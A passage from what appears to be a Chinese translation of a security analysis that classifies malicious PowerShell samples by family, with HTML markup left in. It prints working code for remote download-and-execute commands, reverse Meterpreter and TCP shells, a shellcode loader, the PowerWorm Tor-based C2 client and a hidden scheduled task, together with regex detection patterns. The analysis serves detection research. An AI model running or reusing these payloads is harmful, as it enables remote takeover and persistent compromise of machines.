YaHei&#39;;">此类变种在PowerShell中直接使用系统已配置的代理及用户凭证。用户名通过Web请求中的“u“参数进行传递。这是一种典型的“记录型”技术，攻击者可以借此鉴别他们所突破的受害者，也可以用来处理后续的交互方式（比如，如果攻击者发现沙盒相关的用户凭证则会阻断后续连接）。</span></p><pre class="brush:plain;toolbar:false">$x=$Env:username;$u=&quot;http://54.213.195[.]138/s2.txt?u=&quot;&nbsp;+&nbsp;$x;$p&nbsp;=&nbsp;[System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object&nbsp;net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);Invoke-Expression&nbsp;-Command&nbsp;$s;</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">4.9 Meterpreter RHTTP（6个样本，占比0.15%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此类变种下载在PowerShell Empire或PowerSploit中使用的Invoke-Shellcode脚本，然后调用该函数生成一个反弹型HTTPS Meterpreter shell。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这6个样本中，有5个样本是从GitHub上下载脚本。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">GitHub版：</span></p><pre class="brush:plain;toolbar:false">iex&nbsp;(New-Object&nbsp;Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1&quot;);&nbsp;Invoke-Shellcode&nbsp;-Payload&nbsp;windows/meterpreter/reverse_http&nbsp;-Lhost&nbsp;88.160.254[.]183&nbsp;-Lport&nbsp;8080&nbsp;-Force</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">非GitHub版：</span></p><pre class="brush:plain;toolbar:false">IEX&nbsp;(New-Object&nbsp;Net.WebClient).DownloadString(&#39;http://el8[.]pw/ps/CodeExecution/Invoke-Shellcode.ps1&#39;);&nbsp;Invoke-Shellcode&nbsp;-Payload&nbsp;windows/meterpreter/reverse_https&nbsp;-Lhost&nbsp;65.112.221[.]34&nbsp;-Lport&nbsp;443&nbsp;–Force</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">4.10 Downloader Kraken（5个样本，占比0.12%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此类变种的命名方式来源于其下载的可执行文件名（“Kraken.jpg”），它使用了与Downloader DFSP类似的下载技术。不同的一点是此类变种不直接使用“$env”环境变量，而是使用System.IO.Path来获得$TEMP目录的路径。</span></p><pre class="brush:plain;toolbar:false">IEX&nbsp;(New-Object&nbsp;Net.WebClient).DownloadString(&#39;http://el8[.]pw/ps/CodeExecution/Invoke-Shellcode.ps1&#39;);&nbsp;Invoke-Shellcode&nbsp;-Payload&nbsp;windows/meterpreter/reverse_https&nbsp;-Lhost&nbsp;65.112.221[.]34&nbsp;-Lport&nbsp;443&nbsp;–Force</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">4.11 AppLocker Bypass（4个样本，占比0.12%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此类变种使用PowerShell运行regsvr32工具以绕过Windows的AppLocker策略。该技术最早由Casey Smith公布，利用该技术使得regsvr32在注销COM对象时脚本能够得到执行机会。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">（二）嵌入型载荷类别</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此类PowerShell代码的主要目的是运行嵌入型载荷（如shellcode）。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.12 Shellcode注入（1,147个样本，占比27.89%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.13 Unicorn（611个样本，占比14.90%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.14 SET（199个样本，占比4.85%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.15 Unicorn修改版（14个样本，占比0.34%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我在前文描述了SET和Magic Unicorn的Shellcode注入技术的实现方法，我决定利用这种shellcode注入模板对这类变种进行归类（4.12-4.15）。以下是“Shellcode注入”变种的一个样本，来源于Matt Graeber的原始博文，你可以从中发现该样本与SET和Magic Unicorn的相似性。</span></p><pre class="brush:plain;toolbar:false">$c&nbsp;=&nbsp;&#39;[DllImport(&quot;kernel32.dll&quot;)]public&nbsp;static&nbsp;extern&nbsp;IntPtr&nbsp;VirtualAlloc(IntPtr&nbsp;lpAddress,&nbsp;uint&nbsp;dwSize,&nbsp;uint&nbsp;flAllocationType,&nbsp;uint&nbsp;flProtect);[DllImport(&quot;kernel32.dll&quot;)]public&nbsp;static&nbsp;extern&nbsp;IntPtr&nbsp;CreateThread(IntPtr&nbsp;lpThreadAttributes,&nbsp;uint&nbsp;dwStackSize,&nbsp;IntPtr&nbsp;lpStartAddress,&nbsp;IntPtr&nbsp;lpParameter,&nbsp;uint&nbsp;dwCreationFlags,&nbsp;IntPtr&nbsp;lpThreadId);[DllImport(&quot;msvcrt.dll&quot;)]public&nbsp;static&nbsp;extern&nbsp;IntPtr&nbsp;memset(IntPtr&nbsp;dest,&nbsp;uint&nbsp;src,&nbsp;uint&nbsp;count);&#39;;$w&nbsp;=&nbsp;Add-Type&nbsp;-memberDefinition&nbsp;$c&nbsp;-Name&nbsp;&quot;Win32&quot;&nbsp;-namespace&nbsp;Win32Functions&nbsp;-passthru;[Byte[]];[Byte[]]$z&nbsp;=&nbsp;0xbf,&amp;lt;SHELLCODE&amp;gt;,0x19;$g&nbsp;=&nbsp;0x1000;if&nbsp;($z.Length&nbsp;-gt&nbsp;0x1000){$g&nbsp;=&nbsp;$z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for&nbsp;($i=0;$i&nbsp;-le&nbsp;($z.Length-1);$i++)&nbsp;{$w::memset([IntPtr]($x.ToInt32()+$i),&nbsp;$z[$i],&nbsp;1)};$w::CreateThread(0,0,$x,0,0,0);for&nbsp;(;;){Start-sleep&nbsp;60};</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这四类变种几乎覆盖了在启动EXE文件整个过程中所用到的所有技术。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">以上代码片段的要点是样本按照以下顺序从DLL文件中导入函数。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">“kernel32.dll”中的VirtualAlloc函数，</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">“kernel32.dll”中的CreateThread函数，</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">“msvcrt.dll”中的memset函数。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">之后他们使用“0x”十六进制表示方法将shellcode载入字节数组中，然后调用VirtualAlloc函数分配至少4,096字节大小的RWX内存页面空间，通过memset函数将字节数组拷贝至内存中，利用CreateThread函数将执行权交给shellcode。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在1,971个样本中，有1,211个不同的shellcode载荷，这表明有50%以上的shellcode载荷被多个样本重复使用。这些工具大多数都使用Metasploit来生成shellcode，在不指定载荷情况下，通常都会选择反弹型Meterpreter shell。例如，下面是一行来自于Magic Unicorn中的代码，用来打印如何指定MSF载荷。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">print(&quot;PS Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443&quot;)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">以来代码用来在指定系统平台、架构及编码条件下生成载荷：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">&quot;msfvenom&nbsp;-p&nbsp;%s&nbsp;%s&nbsp;%s&nbsp;StagerURILength=5&nbsp;StagerVerifySSLCert=false&nbsp;-e&nbsp;x86/shikata_ga_nai&nbsp;-a&nbsp;x86&nbsp;--platform&nbsp;windows&nbsp;--smallest&nbsp;-f&nbsp;c&quot;&nbsp;%&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload,&nbsp;ipaddr,&nbsp;port),&nbsp;stdout=subprocess.PIPE,&nbsp;stderr=subprocess.PIPE,&nbsp;shell=True)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">从shellcode长度来看，两种常见的长度分别是294字节和312字节，对应的样本数分别是846个和544个，其他长度所对应的样本数则相差较大。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t0190eb00b3ad7f9bcf.png" title="t0190eb00b3ad7f9bcf.png" alt="http://p4.qhimg.com/t0190eb00b3ad7f9bcf.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我认为造成这种现象的原因在于它们可能使用相同的工具来生成shellcode载荷，除了在某些地方（如4字节的IP地址，C2服务器的URL地址等）做了稍微改动。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">本文对变种的分类主要是基于特征值法，以下是筛选这四类变种的正则表达式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Shellcode注入：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">&quot;^(\$c&nbsp;=&nbsp;|\$1&nbsp;=&nbsp;[\&quot;\&#39;]\$c&nbsp;=&nbsp;)&quot;
&quot;\$g&nbsp;=&nbsp;0x1000&quot;&nbsp;
&quot;\$z\.Length&nbsp;\-gt&nbsp;0x1000&quot;
&quot;\$z\[\$i\]&quot;
Unicorn：
&quot;\$w&nbsp;\=&nbsp;Add\-Type&nbsp;\-memberDefinition&nbsp;\$[a-zA-Z0-9]{3,4}&nbsp;\-Name&quot;
SET：
&quot;\$code&nbsp;\=&nbsp;[\&#39;]{1,2}\[DllImport&quot;
&quot;\$sc\.Length&nbsp;-gt&nbsp;0x1000\)&quot;
&quot;\$winFunc::memset&quot;
Unicorn修改版：
&quot;^\$[a-zA-Z0-9]{5,7}&nbsp;\=&nbsp;\&#39;\[DllImport.+Start\-sleep&nbsp;60\}\;&quot;</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">4.16 Powerfun Reverse（100个样本，占比2.44%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.17 Powerfun Bind（2个样本，占比0.05%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们在Powerfun中还发现了另一种代码执行方法，它们使用Metasploit的“windows/powershell_reverse_tcp”以及“powershell_bind_tcp”载荷来创建与目标系统的交互式shell。反弹型载荷通过base64进行编码，并通过使用System.Diagnostics.Process来实现进程的后台启动。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">反弹型载荷：</span></p><pre class="brush:plain;toolbar:false">if([IntPtr]::Size&nbsp;-eq&nbsp;4){$b=&#39;powershell.exe&#39;}else{$b=$env:windir+&#39;\syswow64\WindowsPowerShell\v1.0\powershell.exe&#39;};$s=New-Object&nbsp;System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=&#39;-nop&nbsp;-w&nbsp;hidden&nbsp;-c&nbsp;$s=New-Object&nbsp;IO.MemoryStream(,[Convert]::FromBase64String(&#39;&#39;H4sIAFHL6FcCA71W6nlhxGUKAAA=&#39;&#39;));IEX&nbsp;(New-Object&nbsp;IO.StreamReader(New-Object&nbsp;IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();&#39;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=&#39;Hidden&#39;;$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">绑定型载荷使用System.Net.Sockets.TCPClient创建一个TCP listener侦听实例，将收到的PowerShell脚本传递给Invoke-Expression。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">绑定型载荷：</span></p><pre class="brush:plain;toolbar:false">$client&nbsp;=&nbsp;New-Object&nbsp;System.Net.Sockets.TCPClient(&quot;192.168.56.144&quot;,4444);$stream&nbsp;=&nbsp;$client.GetStream();[byte[]]$bytes&nbsp;=&nbsp;0..255|%{0};while(($i&nbsp;=&nbsp;$stream.Read($bytes,&nbsp;0,&nbsp;$bytes.Length))&nbsp;-ne&nbsp;0){;$data&nbsp;=&nbsp;(New-Object&nbsp;-TypeName&nbsp;System.Text.ASCIIEncoding).GetString($bytes,0,&nbsp;$i);$sendback&nbsp;=&nbsp;(iex&nbsp;$data&nbsp;2&amp;gt;&amp;amp;1&nbsp;|&nbsp;Out-String&nbsp;);$sendback2&nbsp;&nbsp;=&nbsp;$sendback&nbsp;+&nbsp;&quot;PS&nbsp;&quot;&nbsp;+&nbsp;(pwd).Path&nbsp;+&nbsp;&quot;&amp;gt;&nbsp;&quot;;$sendbyte&nbsp;=&nbsp;([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">4.18 PowerWorm（19个样本，占比0.49%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">PowerWorm是TrendMicro在2014年定义的一个恶意软件族群，具有通过感染Office文DOC（X）、XLS（X）文档进行传播的能力。此类PowerShell代码在真正的命令之间插入了垃圾数据进行混淆。</span></p><pre class="brush:plain;toolbar:false">&#39;xneZtEDC&#39;;$ErrorActionPreference&nbsp;=&nbsp;&#39;SilentlyContinue&#39;;&#39;uqaaPxuaCN&#39;;&#39;DOBHbJqlkRM&#39;;$kn&nbsp;=&nbsp;(get-wmiobject&nbsp;Win32_ComputerSystemProduct).UUID;&#39;WVy&#39;;&#39;gKEZgPRMl&#39;;if&nbsp;((gp&nbsp;HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run)&nbsp;-match&nbsp;$kn){;&#39;mUzql&#39;;&#39;jsvZDTQITNa&#39;;(Get-Process&nbsp;-id&nbsp;$pid).Kill();&#39;NgpYRhj&#39;;&#39;hVXjCtDvBc&#39;;};&#39;tUVXQmXbZ&#39;;&#39;lkTzhJZHwxU&#39;;&#39;McPzodeY&#39;;&#39;vNNYv&#39;;function&nbsp;e($dkez){;&#39;TfPD&#39;;&#39;WTw&#39;;$jt&nbsp;=&nbsp;(((iex&nbsp;&quot;nslookup&nbsp;-querytype=txt&nbsp;$dkez&nbsp;8.8.8.8&quot;)&nbsp;-match&nbsp;&#39;&quot;&#39;)&nbsp;-replace&nbsp;&#39;&quot;&#39;,&nbsp;&#39;&#39;)[0].Trim();&#39;HdCjwAD&#39;;&#39;sVSjtZRvr&#39;;$ovg.DownloadFile($jt,&nbsp;$tg);&#39;raVw&#39;;&#39;OQNdBkS&#39;;$ei&nbsp;=&nbsp;$ke.NameSpace($tg).Items();&#39;OgnucmQlK&#39;;&#39;Qfqxov&#39;;$ke.NameSpace($sa).CopyHere($ei,&nbsp;20);&#39;GBMdJNr&#39;;&#39;VMWS&#39;;rd&nbsp;$tg;&#39;pnoFau&#39;;&#39;SedloE&#39;;};&#39;NxPZPIV&#39;;&#39;ypi&#39;;&#39;AFElBzCp&#39;;&#39;bYRWML&#39;;&#39;UYANxqtLg&#39;;&#39;QBC&#39;;$sa&nbsp;=&nbsp;$env:APPDATA&nbsp;+&nbsp;&#39;\&#39;&nbsp;+&nbsp;$kn;&#39;Eaxyty&#39;;&#39;IwuaOh&#39;;if&nbsp;(!(Test-Path&nbsp;$sa)){;&#39;amYmrKg&#39;;&#39;vWAgqtEB&#39;;$qr&nbsp;=&nbsp;New-Item&nbsp;-ItemType&nbsp;Directory&nbsp;-Force&nbsp;-Path&nbsp;$sa;&#39;GqNII&#39;;&#39;HNPIQutUpGv&#39;;$qr.Attributes&nbsp;=&nbsp;&quot;Hidden&quot;,&nbsp;&quot;System&quot;,&nbsp;&quot;NotContentIndexed&quot;;&#39;MuRuRa&#39;;&#39;CmlkCszVCO&#39;;};&#39;ZdmIGyj&#39;;&#39;nAYhOpvWV&#39;;&#39;BIAgIntvoU&#39;;&#39;GJTBzyjr&#39;;$zul=$sa+&nbsp;&#39;\tor.exe&#39;;&#39;swInqmX&#39;;&#39;LTXwOFNSuL&#39;;$axs=$sa+&nbsp;&#39;\polipo.exe&#39;;&#39;qkI&#39;;&#39;WJPoaNnarn&#39;;$tg=$sa+&#39;\&#39;+$kn+&#39;.zip&#39;;&#39;Sgw&#39;;&#39;fYthyZ&#39;;$ovg=New-Object&nbsp;System.Net.WebClient;&#39;Ils&#39;;&#39;GRldQfFnfQK&#39;;$ke=New-Object&nbsp;-C&nbsp;Shell.Application;&#39;vVoutJQ&#39;;&#39;gHXAsaxc&#39;;&#39;llaetDv&#39;;&#39;Zix&#39;;if&nbsp;(!(Test-Path&nbsp;$zul)&nbsp;-or&nbsp;!(Test-Path&nbsp;$axs)){;&#39;QtJINrwhS&#39;;&#39;XkAxtKLAJ&#39;;e&nbsp;&#39;i.vankin.de&#39;;&#39;QqVujkSIPS&#39;;&#39;dZdn&#39;;};&#39;GoemQSlIB&#39;;&#39;IOcJU&#39;;&#39;FYTMzpCupR&#39;;&#39;qEnstu&#39;;if&nbsp;(!(Test-Path&nbsp;$zul)&nbsp;-or&nbsp;!(Test-Path&nbsp;$axs)){;&#39;ZGtSt&#39;;&#39;mHkBgIOsU&#39;;e&nbsp;&#39;gg.ibiz.cc&#39;;&#39;sDtXmE&#39;;&#39;xSBk&#39;;};&#39;YaiaAJqKPin&#39;;&#39;gFVK&#39;;&#39;TumvJVvJKRm&#39;;&#39;ULQwp&#39;;$pj=$sa+&#39;\roaminglog&#39;;&#39;numdmmhA&#39;;&#39;ytEF&#39;;saps&nbsp;$zul&nbsp;-Ar&nbsp;&quot;&nbsp;--Log&nbsp;`&quot;notice&nbsp;file&nbsp;$pj`&quot;&quot;&nbsp;-wi&nbsp;Hidden;&#39;JCBc&#39;;&#39;CjHbOtf&#39;;do{sleep&nbsp;1;$xxl=gc&nbsp;$pj}while(!($xxl&nbsp;-match&nbsp;&#39;Bootstrapped&nbsp;100%:&nbsp;Done.&#39;));&#39;wYtpNVJtdz&#39;;&#39;XggiQIPFt&#39;;saps&nbsp;$axs&nbsp;-a&nbsp;&quot;socksParentProxy=localhost:9050&quot;&nbsp;-wi&nbsp;Hidden;&#39;dlV&#39;;&#39;zVLSO&#39;;sleep&nbsp;7;&#39;FzlDdEynuUz&#39;;&#39;Ci&#39;;$zpp=New-Object&nbsp;System.Net.WebProxy(&quot;localhost:8123&quot;);&#39;MsOkmLs&#39;;&#39;zRW&#39;;$zpp.useDefaultCredentials&nbsp;=&nbsp;$true;&#39;PWXVXIMqb&#39;;&#39;lAy&#39;;$ovg.proxy=$zpp;&#39;gEkdkGPjVp&#39;;&#39;xerooSjz&#39;;$ca=&#39;http://powerwormjqj42hu[.]onion/get.php?s=setup&amp;amp;mom=14C6EFBB-F19D-DC11-83A7-001B38A0DF85&amp;amp;uid=&#39;&nbsp;+&nbsp;$kn;&#39;SGCFq&#39;;&#39;GkVVnp&#39;;while(!$qmh){$qmh=$ovg.downloadString($ca)};&#39;rHo&#39;;&#39;jtshvrR&#39;;if&nbsp;($qmh&nbsp;-ne&nbsp;&#39;none&#39;){;&#39;Ju&#39;;&#39;VuUTlp&#39;;iex&nbsp;$qmh;&#39;blhE&#39;;&#39;AeIepyNd&#39;;};&#39;whSp&#39;;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">进行初步整理后，代码如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$ErrorActionPreference&nbsp;=&nbsp;&#39;SilentlyContinue&#39;;
$kn&nbsp;=&nbsp;(get-wmiobject&nbsp;Win32_ComputerSystemProduct).UUID;
if&nbsp;((gp&nbsp;HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run)&nbsp;-match&nbsp;$kn)&nbsp;{;
(Get-Process&nbsp;-id&nbsp;$pid).Kill();
};
function&nbsp;e($dkez){;
$jt&nbsp;=&nbsp;(((iex&nbsp;&quot;nslookup&nbsp;-querytype=txt&nbsp;$dkez&nbsp;8.8.8.8&quot;)&nbsp;-match&nbsp;&#39;&quot;&#39;)&nbsp;-replace&nbsp;&#39;&quot;&#39;,&nbsp;&#39;&#39;)[0].Trim();
$ovg.DownloadFile($jt,&nbsp;$tg);
$ei&nbsp;=&nbsp;$ke.NameSpace($tg).Items();
$ke.NameSpace($sa).CopyHere($ei,&nbsp;20);
rd&nbsp;$tg;
};
$sa&nbsp;=&nbsp;$env:APPDATA&nbsp;+&nbsp;&#39;\&#39;&nbsp;+&nbsp;$kn;
if&nbsp;(!(Test-Path&nbsp;$sa)){;
$qr&nbsp;=&nbsp;New-Item&nbsp;-ItemType&nbsp;Directory&nbsp;-Force&nbsp;-Path&nbsp;$sa;
$qr.Attributes&nbsp;=&nbsp;&quot;Hidden&quot;,&nbsp;&quot;System&quot;,&nbsp;&quot;NotContentIndexed&quot;;
};
$zul=$sa+&nbsp;&#39;\tor.exe&#39;;
$axs=$sa+&nbsp;&#39;\polipo.exe&#39;;
$tg=$sa+&#39;\&#39;+$kn+&#39;.zip&#39;;
$ovg=New-Object&nbsp;System.Net.WebClient;
$ke=New-Object&nbsp;-C&nbsp;Shell.Application;
if&nbsp;(!(Test-Path&nbsp;$zul)&nbsp;-or&nbsp;!(Test-Path&nbsp;$axs)){;
e&nbsp;&#39;i.vankin.de&#39;;
};
if&nbsp;(!(Test-Path&nbsp;$zul)&nbsp;-or&nbsp;!(Test-Path&nbsp;$axs)){;
e&nbsp;&#39;gg.ibiz.cc&#39;;
};
$pj=$sa+&#39;\roaminglog&#39;;
saps&nbsp;$zul&nbsp;-Ar&nbsp;&quot;&nbsp;--Log&nbsp;`&quot;notice&nbsp;file&nbsp;$pj`&quot;&quot;&nbsp;-wi&nbsp;Hidden;
do{
sleep&nbsp;1;
$xxl=gc&nbsp;$pj
}&nbsp;while(!($xxl&nbsp;-match&nbsp;&#39;Bootstrapped&nbsp;100%:&nbsp;Done.&#39;));
saps&nbsp;$axs&nbsp;-a&nbsp;&quot;socksParentProxy=localhost:9050&quot;&nbsp;-wi&nbsp;Hidden;
sleep&nbsp;7;
$zpp=New-Object&nbsp;System.Net.WebProxy(&quot;localhost:8123&quot;);
$zpp.useDefaultCredentials&nbsp;=&nbsp;$true;
$ovg.proxy=$zpp;
$ca=&#39;http://powerwormjqj42hu[.]onion/get.php?s=setup&amp;amp;mom=&amp;amp;uid=&#39;&nbsp;+&nbsp;$kn;
while(!$qmh){
$qmh=$ovg.downloadString($ca)
};
if&nbsp;($qmh&nbsp;-ne&nbsp;&#39;none&#39;){;
iex&nbsp;$qmh;
};</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">该代码通过请求DNS TXT记录获取软件的URL下载地址，从该地址下载Tor和Polipo，利用这些软件持续请求传递给Invoke-Expression的新的PowerShell命令。Matt Graeber在分析这类恶意软件的全部功能方面做了非常出色的研究工作，给出了软件底层PowerShell代码的去混淆和注释版本。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.19 Veil Stream（7个样本，占比0.17%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此类变种使用的技术与“Powerfun Reverse”变种类似，将bae64字符串中的PowerShell代码插入内存，使用Invoke-Expression执行真正的shellcode载荷。代码的结构与Veil框架对应。</span></p><pre class="brush:plain;toolbar:false">Invoke-Expression&nbsp;$(New-Object&nbsp;IO.StreamReader&nbsp;($(New-Object&nbsp;IO.Compression.DeflateStream&nbsp;($(New-Object&nbsp;IO.MemoryStream&nbsp;(,$([Convert]::FromBase64String(&#39;rVZtb5tIEP4eKf9+nJvw==&#39;)))),&nbsp;[IO.Compression.CompressionMode]::Decompress)),&nbsp;[Text.Encoding]::ASCII)).ReadToEnd();</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">（三）本地持久化类别</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此类PowerShell代码的主要目的是实现宿主机的本地持久化。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.20 Scheduled Task COM（11个变量，占比0.27%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此类变种创建计划任务运行恶意二进制文件以实现持久化机制。样本中使用的PE文件来自于所下载的“minicraft.exe”，通过下面所示的PowerShell代码执行。之所以这么做可能是因为使用PowerShell比使用原始下载二进制代码更容易完成这一任务。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">代码所用到的技术与之前的Retefe银行木马有关。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$TaskName&nbsp;=&nbsp;&quot;Microsoft&nbsp;Windows&nbsp;Driver&nbsp;Update&quot;
$TaskDescr&nbsp;=&nbsp;&quot;Microsoft&nbsp;Windows&nbsp;Driver&nbsp;Update&nbsp;Services&quot;
$TaskCommand&nbsp;=&nbsp;&quot;C:\ProgramData\WindowsUpgrade\minecraft.exe&quot;
$TaskScript&nbsp;=&nbsp;&quot;&quot;
$TaskArg&nbsp;=&nbsp;&quot;&quot;
$TaskStartTime&nbsp;=&nbsp;[datetime]::Now.AddMinutes(1)
$service&nbsp;=&nbsp;new-object&nbsp;-ComObject(&quot;Schedule.Service&quot;)
$service.Connect()
$rootFolder&nbsp;=&nbsp;$service.GetFolder(&quot;\&quot;)
$TaskDefinition&nbsp;=&nbsp;$service.NewTask(0)
$TaskDefinition.RegistrationInfo.Description&nbsp;=&nbsp;&quot;$TaskDescr&quot;
$TaskDefinition.Settings.Enabled&nbsp;=&nbsp;$true
$TaskDefinition.Settings.Hidden&nbsp;=&nbsp;$true
$TaskDefinition.Settings.RestartCount&nbsp;=&nbsp;&quot;5&quot;
$TaskDefinition.Settings.StartWhenAvailable&nbsp;=&nbsp;$true
$TaskDefinition.Settings.StopIfGoingOnBatteries&nbsp;=&nbsp;$false
$TaskDefinition.Settings.RestartInterval&nbsp;=&nbsp;&quot;PT5M&quot;
$triggers&nbsp;=&nbsp;$TaskDefinition.Triggers
$trigger&nbsp;=&nbsp;$triggers.Create(8)
$trigger.StartBoundary&nbsp;=&nbsp;$TaskStartTime.ToString(&quot;yyyy-MM-dd&#39;T&#39;HH:mm:ss&quot;)
$trigger.Enabled&nbsp;=&nbsp;$true
$trigger.Repetition.Interval&nbsp;=&nbsp;&quot;PT5M&quot;
$TaskDefinition.Settings.DisallowStartIfOnBatteries&nbsp;=&nbsp;$true
$Action&nbsp;=&nbsp;$TaskDefinition.Actions.Create(0)
$action.Path&nbsp;=&nbsp;&quot;$TaskCommand&quot;
